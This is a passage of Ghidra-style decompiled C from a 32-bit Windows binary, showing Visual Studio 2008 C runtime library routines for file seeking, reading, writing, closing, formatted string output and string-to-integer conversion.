    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2008 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_00410c07();
  }
  return iVar2;
}



void FUN_00410c07(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  long lVar5;
  char *pcVar6;
  FILE *pFVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_c;
  
  pFVar7 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_c = __lseek(_FileHandle,0,1);
  if (local_c < 0) {
    return -1;
  }
  uVar1 = _File->_flag;
  if ((uVar1 & 0x108) == 0) {
    return local_c - _File->_cnt;
  }
  pcVar6 = _File->_ptr;
  pcVar8 = _File->_base;
  local_10 = (int)pcVar6 - (int)pcVar8;
  if ((uVar1 & 3) == 0) {
    if (-1 < (char)uVar1) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      return -1;
    }
  }
  else {
    pcVar2 = pcVar8;
    if ((*(byte *)((&DAT_0042d780)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) & 0x80)
        != 0) {
      for (; pcVar2 < pcVar6; pcVar2 = pcVar2 + 1) {
        if (*pcVar2 == '\n') {
          local_10 = local_10 + 1;
        }
      }
    }
  }
  if (local_c != 0) {
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar6 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_0042d780)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar5 = __lseek(_FileHandle,0,2);
          if (lVar5 == local_c) {
            pcVar6 = _File->_base;
            pcVar8 = pcVar6 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
              if (*pcVar6 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar7->_flag & 0x2000U) == 0;
          }
          else {
            lVar5 = __lseek(_FileHandle,local_c,0);
            if (lVar5 < 0) {
              return -1;
            }
            pFVar7 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar7 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_0042d780)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar7;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_c = local_c - (int)_File;
      }
    }
    return local_10 + local_c;
  }
  return local_10;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2008 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_00410e12();
  }
  return lVar2;
}



void FUN_00410e12(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_00410e97:
        uVar8 = _ElementSize * _Count;
        uVar7 = uVar8;
        puVar2 = (undefined *)_DstBuf;
        uVar1 = _DstSize;
        if ((_File->_flag & 0x10cU) == 0) {
          local_10 = 0x1000;
        }
        else {
          local_10 = _File->_bufsiz;
        }
joined_r0x00410ebd:
        do {
          while( true ) {
            if (uVar7 == 0) {
              return _Count;
            }
            if ((_File->_flag & 0x10cU) == 0) break;
            uVar4 = _File->_cnt;
            if (uVar4 == 0) break;
            if ((int)uVar4 < 0) {
LAB_0041100e:
              _File->_flag = _File->_flag | 0x20;
LAB_00411012:
              return (uVar8 - uVar7) / _ElementSize;
            }
            uVar6 = uVar7;
            if (uVar4 <= uVar7) {
              uVar6 = uVar4;
            }
            if (uVar1 < uVar6) {
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00410e53;
            }
            _memcpy_s(puVar2,uVar1,_File->_ptr,uVar6);
            _File->_cnt = _File->_cnt - uVar6;
            _File->_ptr = _File->_ptr + uVar6;
            uVar7 = uVar7 - uVar6;
            uVar1 = uVar1 - uVar6;
            puVar2 = puVar2 + uVar6;
          }
          if (local_10 <= uVar7) {
            if (local_10 == 0) {
              uVar4 = 0x7fffffff;
              if (uVar7 < 0x80000000) {
                uVar4 = uVar7;
              }
            }
            else {
              if (uVar7 < 0x80000000) {
                uVar6 = uVar7 % local_10;
                uVar4 = uVar7;
              }
              else {
                uVar6 = (uint)(0x7fffffff % (ulonglong)local_10);
                uVar4 = 0x7fffffff;
              }
              uVar4 = uVar4 - uVar6;
            }
            if (uVar1 < uVar4) {
LAB_00410fe1:
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00410e53;
            }
            _DstBuf_00 = puVar2;
            iVar5 = __fileno(_File);
            iVar5 = __read(iVar5,_DstBuf_00,uVar4);
            if (iVar5 == 0) {
              _File->_flag = _File->_flag | 0x10;
              goto LAB_00411012;
            }
            if (iVar5 == -1) goto LAB_0041100e;
            uVar7 = uVar7 - iVar5;
            uVar1 = uVar1 - iVar5;
            puVar2 = puVar2 + iVar5;
            goto joined_r0x00410ebd;
          }
          iVar5 = __filbuf(_File);
          if (iVar5 == -1) goto LAB_00411012;
          if (uVar1 == 0) goto LAB_00410fe1;
          *puVar2 = (char)iVar5;
          local_10 = _File->_bufsiz;
          uVar7 = uVar7 - 1;
          uVar1 = uVar1 - 1;
          puVar2 = puVar2 + 1;
        } while( true );
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_00410e97;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
LAB_00410e53:
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_004110b2();
      return sVar2;
    }
    if (_DstSize != 0xffffffff) {
      _memset(_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_004110b2(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2008 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_004111c4();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_004111c4(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint _Size_00;
  uint uVar5;
  uint uVar6;
  char *_Buf;
  uint local_c;
  char *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar6 = _Size * _Count;
      uVar5 = uVar6;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_00411319;
          }
          _Size_00 = uVar5;
          if (uVar3 <= uVar5) {
            _Size_00 = uVar3;
          }
          _memcpy(_File->_ptr,_DstBuf,_Size_00);
          _File->_cnt = _File->_cnt - _Size_00;
          _File->_ptr = _File->_ptr + _Size_00;
          uVar5 = uVar5 - _Size_00;
LAB_004112d5:
          local_8 = (char *)((int)_DstBuf + _Size_00);
          _DstBuf = local_8;
        }
        if (local_c <= uVar5) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_00411319;
          uVar4 = uVar5;
          if (local_c != 0) {
            uVar4 = uVar5 - uVar5 % local_c;
          }
          _Buf = (char *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            _Size_00 = uVar4;
            if (uVar3 <= uVar4) {
              _Size_00 = uVar3;
            }
            uVar5 = uVar5 - _Size_00;
            if (uVar4 <= uVar3) goto LAB_004112d5;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_00411319:
          return (uVar6 - uVar5) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_00411319;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_004113a6();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_004113a6(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar2;
  }
  if (-1 < iVar2) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      iVar3 = __flsbuf(0,&local_24);
      if (iVar3 == -1) goto LAB_00411494;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar2;
    }
    iVar3 = __flsbuf(0,&local_24);
    if (iVar3 != -1) {
      return iVar2;
    }
  }
LAB_00411494:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vswprintf_helper(__woutput_s_l,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,
                                 _ArgList);
      if (iVar2 < 0) {
        *_DstBuf = L'\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  wchar_t wVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  puVar4 = (undefined4 *)_Dest;
  if (_Count != 0) {
    do {
      wVar1 = *_Source;
      *(wchar_t *)puVar4 = wVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      _Source = _Source + 1;
      if (wVar1 == L'\0') break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2008 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_0042ad98) && ((p_Var2->_ownlocale & DAT_0042acb4) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_0042abb8) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_0042acb4) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2008 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wchar_t *pwVar6;
  ushort uVar7;
  localeinfo_struct local_34;
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_004118d1;
  }
  local_c = 0;
  _C = *param_2;
  pwVar1 = param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = __iswctype_l(_C,8,&local_34);
    if (iVar3 == 0) break;
    _C = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_004116c0:
    _C = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_004116c0;
  uVar5 = (uint)(ushort)_C;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_004118d1:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_0041173e;
    }
    if ((*pwVar6 != L'x') && (*pwVar6 != L'X')) {
      param_4 = 8;
      goto LAB_0041173e;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar6 == L'x' || (*pwVar6 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_0041173e:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar7 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar7);
    if (uVar4 == 0xffffffff) {
      if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < (ushort)(uVar7 - 0x61))) break;
      if ((ushort)(uVar7 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar4 <= local_1c)))))))) {
      local_c = __allmul(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) break;
    }
    uVar5 = (uint)(ushort)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
  pwVar6 = pwVar6 + -1;
  if ((param_5 & 8U) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar6 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4U) != 0) ||
          (((param_5 & 1U) == 0 &&
           ((((param_5 & 2U) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2U) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    if ((param_5 & 1U) == 0) {
      if ((param_5 & 2U) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar6;
  }
  if ((param_5 & 2U) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_004118d1;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  undefined **ppuVar2;
  
  if (DAT_0042c1e8 == 0) {
    ppuVar2 = &PTR_DAT_0042ada0;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  _Var1 = wcstoxq((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        *pcVar3 = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_00411922;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00411922:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar2) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar2;
        }
        iVar3 = __flsbuf(0,&local_24);
        if (iVar3 != -1) {
          return iVar2;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar2 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  return iVar2;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
